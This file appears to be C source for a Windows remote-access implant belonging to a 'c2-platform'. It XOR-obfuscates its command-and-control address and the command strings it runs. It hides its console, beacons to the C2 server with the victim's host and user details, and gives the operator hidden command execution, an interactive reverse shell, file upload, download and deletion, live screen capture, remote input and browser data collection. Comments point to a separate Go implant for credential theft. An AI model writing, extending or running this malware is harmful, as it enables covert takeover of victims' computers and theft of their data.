/* Windows xor-tcp implant (c2-platform)
 * Protocol: MAGIC A1B7, XOR payload
 * Build: make -C implant
 */
#include "implant.h"
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma pack(push, 1)
typedef struct {
    unsigned char mag[8];
    unsigned char xor_key;
    unsigned char host[63];
    unsigned char port[8];
} C2Patch;
#pragma pack(pop)
static C2Patch g_c2 = {
    { 'C', '2', 'P', 'A', 'T', 'C', 'H', '!' },
    0x5A,
    { 0x6b, 0x6a, 0x74, 0x68, 0x6b, 0x6b, 0x74, 0x6f, 0x6f, 0x74, 0x68 },
    { 0x69, 0x6e, 0x6f, 0x6c, 0x6d },
};
/* C2_CMD_C_ENC */
static const unsigned char enc_cmd_c[] = {0x39, 0x37, 0x3e, 0x74, 0x3f, 0x22, 0x3f, 0x7a, 0x75, 0x39, 0x7a, 0x7f, 0x29, 0x00};
/* C2_CMD_K_ENC */
static const unsigned char enc_cmd_k[] = {0x39, 0x37, 0x3e, 0x74, 0x3f, 0x22, 0x3f, 0x7a, 0x75, 0x0b, 0x7a, 0x75, 0x11, 0x7a, 0x39, 0x32, 0x39, 0x2a, 0x7a, 0x6c, 0x6f, 0x6a, 0x6a, 0x6b, 0x64, 0x34, 0x2f, 0x36, 0x00};
static void xdec_k(char* dst, const unsigned char* enc, unsigned char k) {
    int i = 0;
    while (enc[i]) { dst[i] = (char)(enc[i] ^ k); i++; }
    dst[i] = 0;
}

static const unsigned char xkey[32] = {
    0x2C,0x91,0x4F,0xE6,0x03,0xAA,0x7D,0x18,
    0xB5,0x62,0xCF,0x34,0xE9,0x8A,0x51,0x0D,
    0xF6,0x23,0x78,0xAC,0x41,0x9E,0x07,0xDC,
    0x65,0x38,0x90,0x4B,0x12,0xF9,0x06,0xB3
};

static void crypt_buf(unsigned char* d, int n, int seed) {
    int i;
    for (i = 0; i < n; i++)
        d[i] ^= xkey[(i + seed) & 31];
}

/* send() may accept fewer bytes than asked (small socket buffer, slow link).
   The old code compared the return value against the full length and treated a
   short write as fatal, which tore the session down on the first command whose
   reply did not fit in one go. */
static int send_all(SOCKET s, const unsigned char* buf, int len) {
    int sent = 0;
    while (sent < len) {
        int r = send(s, (const char*)buf + sent, len - sent, 0);
        if (r <= 0) return -1;
        sent += r;
    }
    return 0;
}

int send_frame(SOCKET s, unsigned short type,
               const unsigned char* payload, int plen) {
    static unsigned char tmp[BUF_SZ];
    unsigned char hdr[8];
    hdr[0] = MAGIC0; hdr[1] = MAGIC1;
    hdr[2] = (unsigned char)(type & 0xFF); hdr[3] = (unsigned char)((type >> 8) & 0xFF);
    hdr[4] = (unsigned char)(plen & 0xFF); hdr[5] = (unsigned char)((plen >> 8) & 0xFF);
    hdr[6] = (unsigned char)((plen >> 16) & 0xFF); hdr[7] = (unsigned char)((plen >> 24) & 0xFF);
    if (send_all(s, hdr, 8) != 0) return -1;
    if (plen > 0) {
        if (plen > BUF_SZ) return -1;
        memcpy(tmp, payload, plen);
        crypt_buf(tmp, plen, type);
        if (send_all(s, tmp, plen) != 0) return -1;
    }
    return 0;
}

static int recv_frame(SOCKET s, unsigned short* type,
                      unsigned char* out, int* outlen) {
    unsigned char hdr[8];
    int got = 0;
    int plen;
    while (got < 8) {
        int r = recv(s, (char*)hdr + got, 8 - got, 0);
        if (r <= 0) return -1;
        got += r;
    }
    if (hdr[0] != MAGIC0 || hdr[1] != MAGIC1) return -1;
    *type = (unsigned short)(hdr[2] | (hdr[3] << 8));
    plen = hdr[4] | (hdr[5] << 8) | (hdr[6] << 16) | (hdr[7] << 24);
    if (plen < 0 || plen > BUF_SZ) return -1;
    got = 0;
    while (got < plen) {
        int r = recv(s, (char*)out + got, plen - got, 0);
        if (r <= 0) return -1;
        got += r;
    }
    crypt_buf(out, plen, *type);
    *outlen = plen;
    return 0;
}

static void put_u16(unsigned char* p, unsigned short v) {
    p[0] = (unsigned char)(v & 0xFF);
    p[1] = (unsigned char)((v >> 8) & 0xFF);
}

static int append_str(unsigned char* buf, int cap, int off, const char* s) {
    int n = (int)strlen(s);
    if (n > 0xffff) n = 0xffff;
    if (off + 2 + n > cap) return -1;
    put_u16(buf + off, (unsigned short)n);
    memcpy(buf + off + 2, s, n);
    return off + 2 + n;
}

static int build_register(unsigned char* buf, int cap) {
    char host[256], user[256], ip[64];
    DWORD n;
    int off = 0;
    host[0] = user[0] = ip[0] = 0;
    n = sizeof(host);
    GetComputerNameA(host, &n);
    n = sizeof(user);
    GetUserNameA(user, &n);
    {
        char hostname[256];
        struct hostent* he;
        gethostname(hostname, sizeof(hostname));
        he = gethostbyname(hostname);
        if (he && he->h_addr_list && he->h_addr_list[0]) {
            struct in_addr a;
            memcpy(&a, he->h_addr_list[0], 4);
            strncpy(ip, inet_ntoa(a), sizeof(ip) - 1);
        }
    }
    if (ip[0] == 0) strncpy(ip, "0.0.0.0", sizeof(ip) - 1);
    if (cap < 5) return -1;
    buf[0] = 1;
    {
        DWORD pid = GetCurrentProcessId();
        buf[1] = (unsigned char)(pid & 0xFF);
        buf[2] = (unsigned char)((pid >> 8) & 0xFF);
        buf[3] = (unsigned char)((pid >> 16) & 0xFF);
        buf[4] = (unsigned char)((pid >> 24) & 0xFF);
    }
    off = 5;
    off = append_str(buf, cap, off, host); if (off < 0) return -1;
    off = append_str(buf, cap, off, user); if (off < 0) return -1;
    off = append_str(buf, cap, off, "windows"); if (off < 0) return -1;
    off = append_str(buf, cap, off, "x64"); if (off < 0) return -1;
    off = append_str(buf, cap, off, ip); if (off < 0) return -1;
    return off;
}

static void run_cmd(SOCKET s, const char* cmdline) {
    SECURITY_ATTRIBUTES sa;
    HANDLE hOutR = NULL, hOutW = NULL;
    char buf[8192];
    DWORD rd = 0;
    unsigned int total = 0;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmd[1024];
    HANDLE hIn;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    if (!CreatePipe(&hOutR, &hOutW, &sa, 0)) {
        send_err(s, "pipe fail");
        return;
    }
    SetHandleInformation(hOutW, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
    /* GUI subsystem has no std handles: give the child a real NUL stdin so
       commands that read stdin do not hang on an invalid handle. */
    hIn = CreateFileA("NUL", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                      &sa, OPEN_EXISTING, 0, NULL);
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hOutW;
    si.hStdError = hOutW;
    si.hStdInput = hIn != INVALID_HANDLE_VALUE ? hIn : NULL;
    {
        char fmt[24];
        xdec_k(fmt, enc_cmd_c, 0x5A);
        snprintf(cmd, sizeof(cmd), fmt, cmdline);
    }
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hOutR); CloseHandle(hOutW);
        if (hIn != INVALID_HANDLE_VALUE) CloseHandle(hIn);
        send_err(s, "spawn fail");
        return;
    }
    CloseHandle(hOutW);
    if (hIn != INVALID_HANDLE_VALUE) CloseHandle(hIn);
    for (;;) {
        BOOL ok = ReadFile(hOutR, buf, sizeof(buf) - 1, &rd, NULL);
        if (!ok || rd == 0) break;
        if (send_frame(s, RSP_DATA, (unsigned char*)buf, (int)rd) != 0) break;
        total += rd;
    }
    WaitForSingleObject(pi.hProcess, 20000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hOutR);
    if (total == 0) send_frame(s, RSP_DATA, (unsigned char*)"(no output)", 11);
    send_frame(s, RSP_END, NULL, 0);
}

static HANDLE g_sh_in = NULL, g_sh_out = NULL, g_sh_proc = NULL;

static void shell_close(void) {
    if (g_sh_in) { CloseHandle(g_sh_in); g_sh_in = NULL; }
    if (g_sh_out) { CloseHandle(g_sh_out); g_sh_out = NULL; }
    if (g_sh_proc) {
        TerminateProcess(g_sh_proc, 0);
        CloseHandle(g_sh_proc);
        g_sh_proc = NULL;
    }
}

static int shell_start(void) {
    SECURITY_ATTRIBUTES sa;
    HANDLE inR = NULL, inW = NULL, outR = NULL, outW = NULL;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmd[80];
    if (g_sh_proc) shell_close();
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    if (!CreatePipe(&outR, &outW, &sa, 0)) return -1;
    if (!CreatePipe(&inR, &inW, &sa, 0)) {
        CloseHandle(outR); CloseHandle(outW); return -1;
    }
    SetHandleInformation(outR, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(inW, HANDLE_FLAG_INHERIT, 0);
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = inR;
    si.hStdOutput = outW;
    si.hStdError = outW;
    xdec_k(cmd, enc_cmd_k, 0x5A);
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
                        NULL, NULL, &si, &pi)) {
        CloseHandle(inR); CloseHandle(inW); CloseHandle(outR); CloseHandle(outW);
        return -1;
    }
    CloseHandle(inR);
    CloseHandle(outW);
    CloseHandle(pi.hThread);
    g_sh_in = inW;
    g_sh_out = outR;
    g_sh_proc = pi.hProcess;
    return 0;
}

static void shell_pump(SOCKET s) {
    DWORD avail = 0, rd = 0;
    unsigned char buf[4096];
    if (!g_sh_out) return;
    if (g_sh_proc && WaitForSingleObject(g_sh_proc, 0) == WAIT_OBJECT_0) {
        while (PeekNamedPipe(g_sh_out, NULL, 0, NULL, &avail, NULL) && avail) {
            DWORD n = avail > sizeof(buf) ? (DWORD)sizeof(buf) : avail;
            if (!ReadFile(g_sh_out, buf, n, &rd, NULL) || rd == 0) break;
            send_frame(s, RSP_SHELL, buf, (int)rd);
        }
        shell_close();
        send_frame(s, RSP_END, NULL, 0);
        return;
    }
    if (PeekNamedPipe(g_sh_out, NULL, 0, NULL, &avail, NULL) && avail) {
        DWORD n = avail > sizeof(buf) ? (DWORD)sizeof(buf) : avail;
        if (ReadFile(g_sh_out, buf, n, &rd, NULL) && rd)
            send_frame(s, RSP_SHELL, buf, (int)rd);
    }
}

static int session_loop(SOCKET s) {
    unsigned char* inbuf = (unsigned char*)malloc(BUF_SZ);
    unsigned char regbuf[1024];
    unsigned short type;
    int inlen;
    int rlen;
    DWORD last_hb;
    int desk_on = 0;
    int desk_max = 1920;
    int desk_q = 85;
    DWORD last_cap = 0;
    if (!inbuf) return -1;
    rlen = build_register(regbuf, sizeof(regbuf));
    if (rlen < 0) { free(inbuf); return -1; }
    if (send_frame(s, CMD_REGISTER, regbuf, rlen) != 0) { free(inbuf); return -1; }
    if (recv_frame(s, &type, inbuf, &inlen) != 0) { free(inbuf); return -1; }
    if (type != RSP_OK) { free(inbuf); return -1; }

    last_hb = GetTickCount();
    for (;;) {
        fd_set rfds;
        struct timeval tv;
        int sel;
        FD_ZERO(&rfds);
        FD_SET(s, &rfds);
        tv.tv_sec = (desk_on || g_sh_proc) ? 0 : 1;
        tv.tv_usec = (desk_on || g_sh_proc) ? 80000 : 0;
        sel = select(0, &rfds, NULL, NULL, &tv);
        if (sel < 0) { free(inbuf); return -1; }
        if (sel > 0 && FD_ISSET(s, &rfds)) {
            if (recv_frame(s, &type, inbuf, &inlen) != 0) { free(inbuf); return -1; }
            if (type == CMD_PING) {
                send_frame(s, RSP_DATA, (unsigned char*)"pong", 4);
            } else if (type == CMD_EXEC) {
                if (inlen >= BUF_SZ) inlen = BUF_SZ - 1;
                inbuf[inlen] = 0;
                desk_on = 0;
                run_cmd(s, (char*)inbuf);
                last_hb = GetTickCount();
            } else if (type == CMD_FS_LS) {
                if (inlen >= BUF_SZ) inlen = BUF_SZ - 1;
                inbuf[inlen] = 0;
                handle_fs_ls(s, (char*)inbuf);
                last_hb = GetTickCount();
            } else if (type == CMD_FS_GET) {
                if (inlen >= BUF_SZ) inlen = BUF_SZ - 1;
                inbuf[inlen] = 0;
                handle_fs_get(s, (char*)inbuf);
                last_hb = GetTickCount();
            } else if (type == CMD_SCREEN) {
                handle_screen(s, 1920, 85, 1);
                last_hb = GetTickCount();
            } else if (type == CMD_DESK_ON) {
                desk_on = 1;
                desk_max = 1920;
                desk_q = 85;
                if (inlen >= 2) {
                    desk_max = inbuf[0] | (inbuf[1] << 8);
                    if (desk_max > 100 && desk_max < 640) desk_max = 640;
                    if (desk_max > 3840) desk_max = 3840;
                }
                if (inlen >= 4) {
                    desk_q = inbuf[2] | (inbuf[3] << 8);
                    if (desk_q < 40) desk_q = 40;
                    if (desk_q > 95) desk_q = 95;
                }
                last_cap = 0;
            } else if (type == CMD_DESK_OFF) {
                desk_on = 0;
                send_frame(s, RSP_END, NULL, 0);
            } else if (type == CMD_INPUT) {
                handle_input(inbuf, inlen);
            } else if (type == CMD_SHELL_ON) {
                if (shell_start() != 0) send_err(s, "shell fail");
                last_hb = GetTickCount();
            } else if (type == CMD_FS_PUT) {
                handle_fs_put(s, inbuf, inlen);
                last_hb = GetTickCount();
            } else if (type == CMD_BROWSER) {
                handle_browser(s);
                last_hb = GetTickCount();
            } else if (type == CMD_CREDS || type == CMD_BROWSER_DEEP) {
                /* This build has no credential collector: it would need the
                   SQLite page reader plus DPAPI/AES-GCM unwrapping that the Go
                   implant carries. Answer explicitly instead of ignoring the
                   frame - silence leaves the task open forever and wedges the
                   session queue. */
                send_err(s, type == CMD_CREDS
                         ? "C 植入端不支持凭据采集，请改用 Go 植入端"
                         : "C 植入端不支持浏览器深度采集，请改用 Go 植入端");
                last_hb = GetTickCount();
            } else if (type == CMD_FS_DEL) {
                if (inlen >= BUF_SZ) inlen = BUF_SZ - 1;
                inbuf[inlen] = 0;
                handle_fs_del(s, (char*)inbuf);
                last_hb = GetTickCount();
            } else if (type == CMD_FS_MKDIR) {
                if (inlen >= BUF_SZ) inlen = BUF_SZ - 1;
                inbuf[inlen] = 0;
                handle_fs_mkdir(s, (char*)inbuf);
                last_hb = GetTickCount();
            } else if (type == CMD_FS_REN) {
                if (inlen >= BUF_SZ) inlen = BUF_SZ - 1;
                inbuf[inlen] = 0;
                handle_fs_ren(s, (char*)inbuf);
                last_hb = GetTickCount();
            } else if (type == CMD_SHELL_IN) {
                if (g_sh_in && inlen > 0) {
                    DWORD wr = 0;
                    if (inlen == 1 && inbuf[0] == '\r')
                        WriteFile(g_sh_in, "\r\n", 2, &wr, NULL);
                    else
                        WriteFile(g_sh_in, inbuf, (DWORD)inlen, &wr, NULL);
                }
            } else if (type == CMD_SHELL_OFF) {
                shell_close();
                send_frame(s, RSP_SHELL_END, NULL, 0);
            } else if (type == CMD_QUIT) {
                shell_close();
                free(inbuf);
                return 2;
            }
        }
        if (g_sh_proc) shell_pump(s);
        if (desk_on && GetTickCount() - last_cap >= 450) {
            handle_screen(s, desk_max, desk_q, 0);
            last_cap = GetTickCount();
            last_hb = last_cap;
        }
        if (GetTickCount() - last_hb >= 10000) {
            if (send_frame(s, CMD_HEARTBEAT, NULL, 0) != 0) { free(inbuf); return -1; }
            last_hb = GetTickCount();
        }
    }
}

int main(void) {
    WSADATA wsa;
    char host[64], port[16];
    int backoff = 5;
    FreeConsole();
    /* CreateStreamOnHGlobal (jpeg encoder) fails with CO_E_NOTINITIALIZED
       unless this thread has COM initialized. */
    OleInitialize(NULL);
    {
        typedef BOOL(WINAPI* SetCtx)(HANDLE);
        HMODULE u = GetModuleHandleA("user32.dll");
        SetCtx setctx = u ? (SetCtx)GetProcAddress(u, "SetProcessDpiAwarenessContext") : NULL;
        if (!setctx || !setctx((HANDLE)(LONG_PTR)-4))
            SetProcessDPIAware();
    }

    WSAStartup(MAKEWORD(2, 2), &wsa);
    xdec_k(host, g_c2.host, g_c2.xor_key);
    xdec_k(port, g_c2.port, g_c2.xor_key);

    for (;;) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        if (s == INVALID_SOCKET) {
            Sleep(backoff * 1000);
            continue;
        }
        {
            struct addrinfo hints, *res = NULL;
            memset(&hints, 0, sizeof(hints));
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;
            if (getaddrinfo(host, port, &hints, &res) != 0 || !res) {
                closesocket(s);
                Sleep(backoff * 1000);
                if (backoff < 30) backoff *= 2;
                if (backoff > 30) backoff = 30;
                continue;
            }
            if (connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
                freeaddrinfo(res);
                closesocket(s);
                Sleep(backoff * 1000);
                if (backoff < 30) backoff *= 2;
                if (backoff > 30) backoff = 30;
                continue;
            }
            freeaddrinfo(res);
        }
        backoff = 5;
        {
            int rc = session_loop(s);
            closesocket(s);
            if (rc == 2) break;
        }
        Sleep(2000);
    }
}
